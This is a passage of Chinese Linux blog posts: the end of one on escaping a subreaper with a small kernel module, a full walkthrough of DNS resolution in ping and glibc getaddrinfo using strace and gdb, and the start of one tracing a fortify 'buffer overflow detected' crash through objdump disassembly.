			if (!reaper->signal->is_child_subreaper)
				continue;
			thread = find_alive_thread(reaper);
			if (thread)
				return thread;
		&#125;
	&#125;

	return child_reaper;
&#125;
  我们从find_new_reaper中可以知道，当has_child_subreaper有值时，我们就从当前进程的父进程开始查找，当找到一个进程的is_child_subreaper属性是有值时，我们就返回这个进程作为真正的reaper。当has_child_subreaper无值时，就是以init进程为reaper来托孤。
  从以上的推理来看，我们有两个方案可以逃离PR_SET_CHILD_SUBREAPER影响：


直接改写真正PR_SET_CHILD_SUBREAPER的地方，不启用这个属性。例如修改systemd的源码。


写一个内核态的小工具，修改指定进程的as_child_subreaper的值，当我们禁用此值时，在进程退出时，就会把子进程托孤给init进程。






我们怎么逃离PR_SET_CHILD_SUBREAPER的影响呢？

  按照上一个小结的结论，我们一般情况下是不会去改一些开源的系统程序，例如：systemd。因此我们选择直接写一个基本的内核态模块，直接修改其task_struct数据结构即可。ko文件如下：
#include &lt;linux/module.h>	/* Needed by all modules */
#include &lt;linux/kernel.h>	/* Needed for KERN_INFO */

#include &lt;linux/pid.h>
#include &lt;linux/sched.h>
#include &lt;linux/sched/signal.h>
#include &lt;linux/sched/mm.h>
#include &lt;linux/mm_types.h>
#include &lt;linux/rwsem.h>
#include &lt;linux/slab.h>
#include &lt;linux/fs.h>
#include &lt;linux/mmap_lock.h>
#include &lt;linux/pid_namespace.h>

MODULE_AUTHOR("sky &lt;sky@sky.com>");
MODULE_DESCRIPTION("sky's hack");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0.0");

static int hack_pid = -1;

module_param_named(hack_pid, hack_pid, uint, S_IRUGO);
MODULE_PARM_DESC(hack_pid, "hack_pid");


int init_module(void)
&#123;
	printk(KERN_INFO "Hello sky_hack.\n");
	printk(KERN_INFO "hack pid %d\n", hack_pid);

	rcu_read_lock();

	struct pid * _pid_struct = find_vpid(hack_pid);
	if (NULL == _pid_struct)&#123;

		printk("get pid struct failed.\n");
		rcu_read_unlock();
		return -1;
	&#125;

	struct task_struct * _task_struct = get_pid_task(_pid_struct, PIDTYPE_PID);
	if (NULL == _task_struct)&#123;

		printk("get task struct failed.\n");
		rcu_read_unlock();
		return -1;
	&#125;


	struct mm_struct * _mm_struct = get_task_mm(_task_struct);
	if (NULL == _mm_struct)&#123;

		printk("get mm struct failed.\n");
		rcu_read_unlock();
		return -1;
	&#125;

	mmap_read_lock(_mm_struct);
    if (_mm_struct->exe_file) &#123;

                char * pathname = kmalloc(PATH_MAX, GFP_ATOMIC);
                if (pathname) &#123;
                    char * p = d_path(&amp;_mm_struct->exe_file->f_path, pathname, PATH_MAX);
                    /*Now you have the path name of exe in p*/
					printk(KERN_INFO "process full path %s\n", p);
                &#125;
				kfree(pathname);
    &#125;
	mmap_read_unlock(_mm_struct);

	struct pid_namespace *pid_ns = task_active_pid_ns(_task_struct);
	struct task_struct *reaper = pid_ns->child_reaper;

	printk(KERN_INFO "pid_ns->child_reaper=%x, current task_struct=%x\n", pid_ns->child_reaper, _task_struct);
	printk(KERN_INFO "is_child_subreaper %d\n", _task_struct->signal->is_child_subreaper);
	printk(KERN_INFO "has_child_subreaper %d\n", _task_struct->signal->has_child_subreaper);

	//escape from a subreaper by do_exit()
	_task_struct->signal->has_child_subreaper = 0;
	rcu_read_unlock();

	return 0;
&#125;

void cleanup_module(void)
&#123;
	printk(KERN_INFO "Goodbye sky_hack.\n");
&#125;
  当前这个驱动的唯一目的就是把指定pid进程的has_child_subreaper改为0，这样就可以逃离subreaper。
  编译Makefile
obj-m += sky_hack.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
  下面我们再一次做上面的测试，运行a.out，查看a.out相关的进程树，然后运行sky_hack.ko hack_pid=‘a.out进程id’，等待一段时间后，当a.out退出后，再次查看a.out的相关进程树即可。
  运行a.out的输出：

    
        
    
    
  我们其实可以看到，按照上面我们的说明进行操作后，a.out第二次打印的ppid已经是1了，这意味着我们逃离subreaper成功了。
  下面我们看看insmod sky_hack.ko hack_pid=14749的输出：

    
        
    
    
  我们其实可以看到，在驱动里面我们打印了a.out进程的has_child_subreaper属性是1，因此我们在驱动中重置了它，导致了退出时，成功托孤给了init进程。
  下面我们看看这整个阶段中的进程树状况：

    
        
    
    
  这里的进程分布和上述开始的一样。
  我们看看逃离subreaper后：

    
        
    
 
  这里的进程分布就和最开始的不一样的，我们成功的将我们的子进程托孤给了init进程。




后记

  我们首先从一个其他问题，遇到了这个现象，然后我们深究了这个现象产生的原因，并且最终尝试设计出逃离这种现象的技术方案。这其中会涉及一些内核源码，驱动编写，同时加深了我们对subreaper的理解。经过这些过程后，我们对Linux内核，Linux的应用开发会有一个新的认知和理解。同时也增强了我们解决问题的综合能力。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Linux Subreaper</tag>
      </tags>
  </entry>
  <entry>
    <title>LinuxDNS分析从入门到放弃（记一次有趣的dns问题排查记录，ping 源码分析，getaddrinfo源码分析）</title>
    <url>/2023/07/02/blog_idx_122/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  ubuntu 18.04
前言

  我们这里有一块嵌入式板卡，当我们通过PING测试内网IP时，发现外网IP访问正常，但是测试域名访问一直报unknown host。一般来说，在ubuntu里面，我们遇到域名不能访问，反手就是去设置/etc/resolv.conf文件里面的nameserver为114.114.114.114。但是万万没有想到，这次我们这样改了之后，还是访问报unknown host。
  当时我就人麻了，但是我仿佛灵光一闪，想到了一个问题：为何以前我们修改了/etc/resolv.conf文件就DNS就正常了，但是这里同样修改了这个文件，就不正常工作？此外，/etc/resolv.conf文件是干嘛的，为何改了DNS就有效了？
  要回答以上问题，根本原因就是要了解Linux平台里面DNS的详细工作流程，于是我踏上了看源码之旅。




探索之旅

  在这里，我们第一件事情就是想到，当我们ping一个域名，或者我们在浏览器里面输入了一个域名，然后访问的那一刻发生了什么？
  首先，当我们进行网络编程的时候，我们不管是send udp msg还是send tcp msg，我们都是需要构建一个struct sockaddr结构，这个结构里面包含了访问的地址，端口等等信息。但是这里的地址是ip地址，并不是域名地址，因此可以猜测，在浏览器访问或者ping域名之前，肯定做了dns查询工作，然后将域名转换之后，得到ip地址才构建出struct sockaddr结构，然后才开始网络访问的操作的。
  下面我去翻阅了ping的源码，在https://git.savannah.gnu.org/cgit/inetutils.git/tree/ping/libping.c?h=v2.4 中的ping_set_dest 函数中，有一个将host转换为struct sockaddr的方法引起了我的注意，他就是：getaddrinfo / gethostbyname。下面是ping的简要工作流程：


在https://git.savannah.gnu.org/cgit/inetutils.git/tree/ping/ping.c?h=v2.4中，main函数中调用了argp_parse，这里面会调用parse_opt，在这里有一个重要的ping_type函数指针在这里设置了，如果我们不配置任何参数的话，那么就是调用的ping_echo函数。


在https://git.savannah.gnu.org/cgit/inetutils.git/tree/ping/ping.c?h=v2.4中，main函数中调用了ping_init，初始化了ICMP的socket，并记录到句柄PING中。


在经历各种初始化后，就会调用ping_type，后面我们默认分析ping_echo。


在https://git.savannah.gnu.org/cgit/inetutils.git/tree/ping/ping_echo.c?h=v2.4中，ping_echo中回去调用ping_set_dest设置参数，同时调用ping_run循环通过send_to发送ping icmp报文。


在https://git.savannah.gnu.org/cgit/inetutils.git/tree/ping/libping.c?h=v2.4中，ping_set_dest 调用getaddrinfo解析域名。






getaddrinfo / gethostbyname

  首先，我们在查这两个方法之前，可以猜测他们的一个功能就是：这两个函数可能拿着域名，去访问了域名服务器，然后解析出ip地址，并且构造了struct sockaddr结构并返回。
  因此我们去看看这两个函数相关的man介绍和源码：根据man手册：https://man7.org/linux/man-pages/man3/getaddrinfo.3.html ，我们可以知道，getaddrinfo已经包含了gethostbyname的工作，因此我们就只需要分析这个方法就行。


getaddrinfo 参数分析
  我们先来看看这个函数的参数含义
//重要的参数结构体
struct addrinfo &#123;
    int              ai_flags;
    int              ai_family;
    int              ai_socktype;
    int              ai_protocol;
    socklen_t        ai_addrlen;
    struct sockaddr *ai_addr;
    char            *ai_canonname;
    struct addrinfo *ai_next;
&#125;;

int getaddrinfo (const char *name, const char *service, const struct addrinfo *hints, struct addrinfo **pai);
//根据https://man7.org/linux/man-pages/man3/getaddrinfo.3.html，我们可以知道：
//name: 域名
//service: 服务，注意这里这个服务会让我们重新复习一遍计算机网络。
//hints: 就是填写struct addrinfo里面的属性，然后getaddrinfo根据这些特殊指定的属性，将对应的struct addrinfo返回回来。
//pai: 此函数返回的一个链表，其中包含了符合要求的struct addrinfo信息。
//其实我们从pai可以知道，当返回有值时，意味着我们知道了一个域名和服务对应的网络地址，然后我们就可以在connect,bind中使用pai->ai_addr了。


getaddrinfo 例子调试分析
  注意：我这里是事后写本文的时候，才发现需要下面的内容。由于getaddrinfo的实现特殊性，其不是很方便查看源码，因此采取strace + gdb + simple example方式来分析此函数的实现。
  首先下面是我的simple example
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;netdb.h>
#include &lt;stdio.h>
#include &lt;sys/socket.h>
#include &lt;netinet/in.h>
#include &lt;arpa/inet.h>
#include &lt;string.h>

int main(int argc, char * argv[])
&#123;
		struct addrinfo hints, *res;
		  memset (&amp;hints, 0, sizeof (hints));
  hints.ai_family = AF_INET;
  hints.ai_flags = AI_CANONNAME;

	if (0 > getaddrinfo("baidu.com", NULL, &amp;hints, &amp;res))&#123;
		perror("get error:");
		return -1;
	&#125;
	struct sockaddr_in * get_addr = res->ai_addr;
	printf("ip for baidu: %s\n", inet_ntoa(get_addr->sin_addr));
	return 0;
&#125;

  然后gcc test.c -o test -g 生成此执行文件。下面是执行此函数的结果图片：

    
        
    
    
  下面是一些读取源码需要的单词简写：


IDNA: Internationalizing Domain Names in Applications


NSCD: name service cache daemon


NSS:  Name Services Switch


CNAME: canonical name (规范化名字)


  下面是resolv.conf的文件内容：
# resolve.conf 内容
# This file is managed by man:systemd-resolved(8). Do not edit.
#
# This is a dynamic resolv.conf file for connecting local clients to the
# internal DNS stub resolver of systemd-resolved. This file lists all
# configured search domains.
#
# Run "systemd-resolve --status" to see details about the uplink DNS servers
# currently in use.
#
# Third party programs must not access this file directly, but only through the
# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,
# replace this symlink by a static file or a different symlink.
#
# See man:systemd-resolved.service(8) for details about the supported modes of
# operation for /etc/resolv.conf.

# nameserver 127.0.0.53
nameserver 8.8.8.8
options edns0
  下面是strace ./test 输出的部分节选（包含了/etc/resolv.conf的内容）
//打开resolve.conf
openat(AT_FDCWD, "/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 3
fstat(3, &#123;st_mode=S_IFREG|0644, st_size=736, ...&#125;) = 0
read(3, "# This file is managed by man:sy"..., 4096) = 736
read(3, "", 4096)                       = 0
close(3)

//通过resolve.conf的dns服务器，查询dns
//这里有个小知识：dns服务器的默认端口是53，详细可以通过/etc/protocol，/etc/services查看
socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 3
connect(3, &#123;sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")&#125;, 16) = 0
poll([&#123;fd=3, events=POLLOUT&#125;], 1, 0)    = 1 ([&#123;fd=3, revents=POLLOUT&#125;])
sendto(3, "5\244\1\0\0\1\0\0\0\0\0\1\5baidu\3com\0\0\1\0\1\0\0)\4\260"..., 38, MSG_NOSIGNAL, NULL, 0) = 38
poll([&#123;fd=3, events=POLLIN&#125;], 1, 5000)  = 1 ([&#123;fd=3, revents=POLLIN&#125;])
ioctl(3, FIONREAD, [70])                = 0
recvfrom(3, "5\244\201\200\0\1\0\2\0\0\0\1\5baidu\3com\0\0\1\0\1\300\f\0\1\0"..., 1024, 0, &#123;sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")&#125;, [28->16]) = 70
close(3)                                = 0

  首先我们要调试glibc的话，需要安装glibc的调试符号：
sudo apt-get install libc6-dbg
cd /usr/src/glibc
tar -xf glibc-&#123;version&#125;.tar.xz
  下面通过GDB 结合 GLIBC的debug info开始调试程序，分析出getaddrinfo中我想关注的部分。
  首先我们调试得到打开/etc/resolv.conf的实现：
gdb ./test
b fopen
# 设置gdb搜索源文件目录，注意你下断点时，对应源码的相对路径
(gdb) set directories /usr/src/glibc/glibc-2.27/xxxx
在多次运行后，抓到打开/etc/resolv.conf的地方，其堆栈如下：
#0  _IO_new_fopen (filename=filename@entry=0x7ffff7b98cea "/etc/resolv.conf", mode=mode@entry=0x7ffff7b9578c "rce") at iofopen.c:88
#1  0x00007ffff7b25c0f in __resolv_conf_load (preinit=preinit@entry=0x0) at res_init.c:553
#2  0x00007ffff7b28459 in __resolv_conf_get_current () at resolv_conf.c:162
#3  0x00007ffff7b26cad in __res_vinit (statp=0x7ffff7dd1bc0 &lt;_res>, preinit=preinit@entry=0) at res_init.c:609
#4  0x00007ffff7b27e50 in maybe_init (preinit=false, ctx=0x555555756530) at resolv_context.c:122
#5  context_get (preinit=false) at resolv_context.c:184
#6  __GI___resolv_context_get () at resolv_context.c:195
#7  0x00007ffff7ae790e in gaih_inet (name=name@entry=0x555555554924 "baidu.com", service=&lt;optimized out>, req=req@entry=0x7fffffffdeb0, pai=pai@entry=0x7fffffffd9c8, 
    naddrs=naddrs@entry=0x7fffffffd9c4, tmpbuf=tmpbuf@entry=0x7fffffffda30) at ../sysdeps/posix/getaddrinfo.c:767
#8  0x00007ffff7ae9c84 in __GI_getaddrinfo (name=&lt;optimized out>, service=&lt;optimized out>, hints=0x7fffffffdeb0, pai=0x7fffffffdea0) at ../sysdeps/posix/getaddrinfo.c:2300
#9  0x000055555555483b in main (argc=1, argv=0x7fffffffdfd8) at test.c:17
因此我们得到了getaddrinfo的打开resolv.conf的调用路径，其值如下：
getaddrinfo–&gt;gaih_inet-&gt;__resolv_context_get()-&gt;context_get()-&gt;maybe_init()-&gt;__res_vinit()-&gt;__resolv_conf_get_current()-&gt;__resolv_conf_load() 这里面会打开resolv.conf
注意，当真正的打开了resolv.conf后，其还会解析此文件，这个部分就不在本文进行分析了。
用同样的方法，对connect下断点，得到了访问dns服务器的堆栈信息：
#0  __libc_connect (fd=3, addr=addr@entry=..., len=16) at ../sysdeps/unix/sysv/linux/connect.c:26
#1  0x00007ffff71b4b20 in reopen (statp=statp@entry=0x7ffff7dd1bc0 &lt;_res>, terrno=terrno@entry=0x7fffffffc0a8, ns=ns@entry=0) at res_send.c:977
#2  0x00007ffff71b5e0b in send_dg (ansp2_malloced=0x0, resplen2=0x0, anssizp2=0x0, ansp2=0x0, anscp=0x7fffffffd168, gotsomewhere=&lt;synthetic pointer>, 
    v_circuit=&lt;synthetic pointer>, ns=0, terrno=0x7fffffffc0a8, anssizp=0x7fffffffc1d0, ansp=0x7fffffffc098, buflen2=0, buf2=0x0, buflen=38, 
    buf=0x7fffffffc200 "\254\212\001", statp=&lt;optimized out>) at res_send.c:1078
#3  __res_context_send (ctx=ctx@entry=0x555555756530, buf=buf@entry=0x7fffffffc200 "\254\212\001", buflen=buflen@entry=38, buf2=buf2@entry=0x0, buflen2=buflen2@entry=0, 
    ans=&lt;optimized out>, ans@entry=0x7fffffffcd10 "cxaPfi", anssiz=&lt;optimized out>, ansp=&lt;optimized out>, ansp2=&lt;optimized out>, nansp2=&lt;optimized out>, 
    resplen2=&lt;optimized out>, ansp2_malloced=&lt;optimized out>) at res_send.c:522
#4  0x00007ffff71b34d1 in __GI___res_context_query (ctx=ctx@entry=0x555555756530, name=name@entry=0x555555554924 "baidu.com", class=class@entry=1, type=type@entry=1, 
    answer=answer@entry=0x7fffffffcd10 "cxaPfi", anslen=anslen@entry=1024, answerp=0x7fffffffd168, answerp2=0x0, nanswerp2=0x0, resplen2=0x0, answerp2_malloced=0x0)
    at res_query.c:216
#5  0x00007ffff71b428d in __res_context_querydomain (domain=0x0, answerp2_malloced=0x0, resplen2=0x0, nanswerp2=0x0, answerp2=0x0, answerp=0x7fffffffd168, anslen=1024, 
    answer=0x7fffffffcd10 "cxaPfi", type=1, class=1, name=0x555555554924 "baidu.com", ctx=0x555555756530) at res_query.c:601
#6  __GI___res_context_search (ctx=ctx@entry=0x555555756530, name=name@entry=0x555555554924 "baidu.com", class=class@entry=1, type=type@entry=1, 
    answer=answer@entry=0x7fffffffcd10 "cxaPfi", anslen=anslen@entry=1024, answerp=0x7fffffffd168, answerp2=0x0, nanswerp2=0x0, resplen2=0x0, answerp2_malloced=0x0)
    at res_query.c:370
#7  0x00007ffff73c7f0c in gethostbyname3_context (ctx=ctx@entry=0x555555756530, name=name@entry=0x555555554924 "baidu.com", af=af@entry=2, 
    result=result@entry=0x7fffffffd7d0, buffer=buffer@entry=0x7fffffffda40 "\377\002", buflen=buflen@entry=1024, errnop=0x7ffff7fca440, h_errnop=0x7ffff7fca4a4, ttlp=0x0, 
    canonp=0x7fffffffd7c8) at nss_dns/dns-host.c:218
#8  0x00007ffff73c8928 in _nss_dns_gethostbyname3_r (name=name@entry=0x555555554924 "baidu.com", af=af@entry=2, result=result@entry=0x7fffffffd7d0, 
    buffer=0x7fffffffda40 "\377\002", buflen=1024, errnop=errnop@entry=0x7ffff7fca440, h_errnop=0x7ffff7fca4a4, ttlp=0x0, canonp=0x7fffffffd7c8) at nss_dns/dns-host.c:164
#9  0x00007ffff7ae7e6f in gaih_inet (name=name@entry=0x555555554924 "baidu.com", service=&lt;optimized out>, req=req@entry=0x7fffffffdeb0, pai=pai@entry=0x7fffffffd9c8, 
    naddrs=naddrs@entry=0x7fffffffd9c4, tmpbuf=tmpbuf@entry=0x7fffffffda30) at ../sysdeps/posix/getaddrinfo.c:885
#10 0x00007ffff7ae9c84 in __GI_getaddrinfo (name=&lt;optimized out>, service=&lt;optimized out>, hints=0x7fffffffdeb0, pai=0x7fffffffdea0) at ../sysdeps/posix/getaddrinfo.c:2300
#11 0x000055555555483b in main (argc=1, argv=0x7fffffffdfd8) at test.c:17
  注意，这里connect的堆栈信息由于struct sockaddr的原因，无法判断是否真实访问的是8.8.8.8，因此我们可以尝试将其转换回（通过inet_ntoa转换ip，通过ntohs转换端口）struct sockaddr_in来分析，分析结果（IP地址，端口号）如下图：

    
        
    
    
  因此我们得到了getaddrinfo的访问8.8.8.8 dns服务器的调用路径，其值如下：
getaddrinfo–&gt;gaih_inet-&gt;_nss_dns_gethostbyname3_r-&gt;gethostbyname3_context-&gt;__res_context_search-&gt;__res_context_querydomain-&gt;__res_context_query-&gt;__res_context_send-&gt;send_dg-&gt;reopen-&gt;__libc_connect 连接 dns服务器，解析dns


特别注意：
这里仅仅是描述了通过dns服务器得到ip的过程，其实相对于getaddrinfo的dns解析来说，这只是其中的一部分，还有通过类似nscd（有兴趣可以去看看man systemd-resolved）等等来解析的方式，这些内容感兴趣可以去看看。




后记

  最后，回到了本文的开始，经过上述的分析后，我找到了我的问题的本质原因。我遇到的问题的本质原因是：由于某些特殊原因导致了connect 114.114.114.114:53 服务器的时候报错了，导致解析域名失败，当我换一个域名服务器（8.8.8.8）就解决了。
  总的来说，本文从ping baidu.com入手，然后分析了ping的源码，得到了我们要分析的重点getaddrinfo。然后我们由于构造一个小例子来分析getaddrinfo的源码，最终得到了/etc/resolv.conf是因为什么原因生效的。
  通过本文的分析，相信我们对DNS的解析过程是有了一个比较清晰的了解了，以后遇到类似的问题也能够有一个好的思路来解决问题。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux</category>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>linux dns</tag>
        <tag>ping 源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次有趣的 buffer overflow detected 问题分析</title>
    <url>/2023/10/22/blog_idx_124/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在我开发的一个实验和学习库中，在很久以前全面启用了编译器的sanitize功能。
  这次报错的程序，是我这个库中某个模块的单元测试模块。但是前面说的都不是重点。诡异的是本次出现的单元测试模块是很久未动的一个模块，而且在本地的单元测试过程中，是能够运行通过的，但是在github的ci上面出问题了。
  首先，报这个错误的原因肯定是我们的程序有问题，但是以前结合调试模式+sanitize功能基本能够把问题排除了，结合了github的ci出现问题，初步判断是由于GCC版本升级后，对于栈溢出的检查更加准确了。
  此外由于此报错是存在在一个release版本的模块，因此我们不能够采取通用的通过代码行来定位问题的方法。
问题初步定位

  首先gdb 初步分析定位，定位到如下地址：
#4  0x00007ffff6a4db81 in __GI___fortify_fail (msg=msg@entry=0x7ffff6acf7e6 "buffer overflow detected") at fortify_fail.c:44
#5  0x00007ffff6a4b870 in __GI___chk_fail () at chk_fail.c:28
#6  0x00007ffff79c06fc in ?? () from ../lib/libylib.so.0
从这里可以知道，我们在执行0x00007ffff79c06fc前面的一个指令的时候出现了&quot;buffer overflow detected&quot;。然后我们通过layout asm查看汇编指令，找到前面一行指令如下：
0x7ffff79c06f2:	b9 00 10 00 00       	mov    $0x1000,%ecx
0x7ffff79c06f7:	e8 44 1e fe ff       	callq  58540 &lt;__memset_chk@plt>
0x7ffff79c06fc:	4c 89 e2             	mov    %r12,%rdx
  其实到了这里，我们可以根据一些手段，可以查到是memset导致了我们的原因，如果要是可以进行源码调试的话，我们甚至马上就能够定位是哪一行导致的。
  但是今天这里提供一种方法，可以复杂定位（兼容一个库里面多个memset调用，兼容release版本调试等等）我们出错这行汇编在我们源码中的大概位置。




问题初步定位

  首先，我们查看一下当前我们这个so文件在内存中的映射位置：
    Start Addr           End Addr       Size     Offset objfile
0x7ffff794a000     0x7ffff7bc2000   0x278000        0x0 /xxx/libylib.so.0.1.0
0x7ffff7bc2000     0x7ffff7dc2000   0x200000   0x278000 /xxx/libylib.so.0.1.0
0x7ffff7dc2000     0x7ffff7dcc000     0xa000   0x278000 /xxx/libylib.so.0.1.0
0x7ffff7dcc000     0x7ffff7dd1000     0x5000   0x282000 /xxx/libylib.so.0.1.0
  首先我们可以分析出0x7ffff79c06f7是存在在内存映射0x7ffff794a000~0x7ffff7bc2000区段中的。此外，我们还知道了一个重要的消息是，当前我们关注的0x7ffff79c06f7在so中的偏移地址是0x7ffff79c06f7-0x7ffff794a000=0x766F7。
  这个时候，我们可以通过objdump -d对libylib.so.0.1.0进行反编译分析。注意，这里要往我们关注的0x766F7偏移前面去寻找，而且还要反复去寻找，直到找到类似函数的边界（这里我建议新手直接上ida，快速解决问题），一般来说就是找函数帧，如果对这个不熟悉，建议使用ida等工具进行分析，可能更加方便。
libylib.so.0.1.0:     file format elf64-x86-64


Disassembly of section .text:

00000000000764d0 &lt;_ZNSt6vectorIhSaIhEE17_M_default_appendEm@@Base+0x2b0>:
   764d0:	fe                   	(bad)  
   764d1:	fd                   	std    
   764d2:	ff 90 66 90 66 2e    	callq  *0x2e669066(%rax)
   764d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   764df:	00 

00000000000764e0 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base>:
   764e0:	48 8b 05 81 b4 40 00 	mov    0x40b481(%rip),%rax        # 481968 &lt;_ZN4yLib6yShell10class_infoE@@Base-0x5058>
   764e7:	c3                   	retq   
   764e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   764ef:	00 
   //注意这里开始
   764f0:	41 57                	push   %r15
   764f2:	41 56                	push   %r14
   764f4:	49 89 fe             	mov    %rdi,%r14
   764f7:	41 55                	push   %r13
   764f9:	41 54                	push   %r12
   764fb:	55                   	push   %rbp
   764fc:	48 89 d5             	mov    %rdx,%rbp
   764ff:	53                   	push   %rbx
   76500:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   76507:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   7650b:	48 2b 16             	sub    (%rsi),%rdx
   7650e:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
   76515:	00 00 
   76517:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   7651e:	00 
   7651f:	31 c0                	xor    %eax,%eax
   76521:	48 8b 47 08          	mov    0x8(%rdi),%rax
   76525:	48 2b 07             	sub    (%rdi),%rax
   76528:	48 c1 fa 05          	sar    $0x5,%rdx
   7652c:	48 c1 f8 05          	sar    $0x5,%rax
   76530:	48 8d 7c 02 01       	lea    0x1(%rdx,%rax,1),%rdi
   76535:	48 89 f8             	mov    %rdi,%rax
   76538:	48 c1 e8 3c          	shr    $0x3c,%rax
   7653c:	0f 85 67 54 fe ff    	jne    5b9a9 &lt;fwrite@plt+0x1221>
   76542:	48 c1 e7 03          	shl    $0x3,%rdi
   76546:	49 89 f4             	mov    %rsi,%r12
   76549:	48 89 cb             	mov    %rcx,%rbx
   7654c:	e8 2f dc fd ff       	callq  54180 &lt;_Znam@plt>
   76551:	49 8b 7e 08          	mov    0x8(%r14),%rdi
   76555:	49 8b 14 24          	mov    (%r12),%rdx
   76559:	49 89 c5             	mov    %rax,%r13
   7655c:	49 8b 74 24 08       	mov    0x8(%r12),%rsi
   76561:	49 8b 06             	mov    (%r14),%rax
   76564:	48 29 d6             	sub    %rdx,%rsi
   76567:	48 29 c7             	sub    %rax,%rdi
   7656a:	49 89 f9             	mov    %rdi,%r9
   7656d:	49 89 f2             	mov    %rsi,%r10
   76570:	49 89 f0             	mov    %rsi,%r8
   76573:	48 01 c7             	add    %rax,%rdi
   76576:	49 c1 f9 05          	sar    $0x5,%r9
   7657a:	49 c1 fa 05          	sar    $0x5,%r10
   7657e:	4b 8d 0c 11          	lea    (%r9,%r10,1),%rcx
   76582:	49 c7 44 cd 00 00 00 	movq   $0x0,0x0(%r13,%rcx,8)
   76589:	00 00 
   7658b:	4c 89 e9             	mov    %r13,%rcx
   7658e:	4d 85 c9             	test   %r9,%r9
   76591:	74 19                	je     765ac &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0xcc>
   76593:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   76598:	48 8b 30             	mov    (%rax),%rsi
   7659b:	48 83 c0 20          	add    $0x20,%rax
   7659f:	48 83 c1 08          	add    $0x8,%rcx
   765a3:	48 89 71 f8          	mov    %rsi,-0x8(%rcx)
   765a7:	48 39 c7             	cmp    %rax,%rdi
   765aa:	75 ec                	jne    76598 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0xb8>
   765ac:	4d 85 d2             	test   %r10,%r10
   765af:	74 23                	je     765d4 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0xf4>
   765b1:	48 89 d0             	mov    %rdx,%rax
   765b4:	4b 8d 54 cd 00       	lea    0x0(%r13,%r9,8),%rdx
   765b9:	4a 8d 34 00          	lea    (%rax,%r8,1),%rsi
   765bd:	0f 1f 00             	nopl   (%rax)
   765c0:	48 8b 08             	mov    (%rax),%rcx
   765c3:	48 83 c0 20          	add    $0x20,%rax
   765c7:	48 83 c2 08          	add    $0x8,%rdx
   765cb:	48 89 4a f8          	mov    %rcx,-0x8(%rdx)
   765cf:	48 39 f0             	cmp    %rsi,%rax
   765d2:	75 ec                	jne    765c0 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0xe0>
   765d4:	48 8b 7d 08          	mov    0x8(%rbp),%rdi
   765d8:	48 2b 7d 00          	sub    0x0(%rbp),%rdi
   765dc:	48 c1 ff 05          	sar    $0x5,%rdi
   765e0:	48 83 c7 01          	add    $0x1,%rdi
   765e4:	48 89 f8             	mov    %rdi,%rax
   765e7:	48 c1 e8 3c          	shr    $0x3c,%rax
   765eb:	0f 85 93 0a 00 00    	jne    77084 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0xba4>
   765f1:	48 c1 e7 03          	shl    $0x3,%rdi
   765f5:	e8 86 db fd ff       	callq  54180 &lt;_Znam@plt>
   765fa:	48 8b 75 08          	mov    0x8(%rbp),%rsi
   765fe:	48 89 c2             	mov    %rax,%rdx
   76601:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
   76606:	48 8b 45 00          	mov    0x0(%rbp),%rax
   7660a:	48 29 c6             	sub    %rax,%rsi
   7660d:	48 89 f1             	mov    %rsi,%rcx
   76610:	48 01 c6             	add    %rax,%rsi
   76613:	48 c1 f9 05          	sar    $0x5,%rcx
   76617:	48 8d 3c ca          	lea    (%rdx,%rcx,8),%rdi
   7661b:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   76622:	48 85 c9             	test   %rcx,%rcx
   76625:	74 1d                	je     76644 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x164>
   76627:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   7662e:	00 00 
   76630:	48 8b 08             	mov    (%rax),%rcx
   76633:	48 83 c0 20          	add    $0x20,%rax
   76637:	48 83 c2 08          	add    $0x8,%rdx
   7663b:	48 89 4a f8          	mov    %rcx,-0x8(%rdx)
   7663f:	48 39 c6             	cmp    %rax,%rsi
   76642:	75 ec                	jne    76630 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x150>
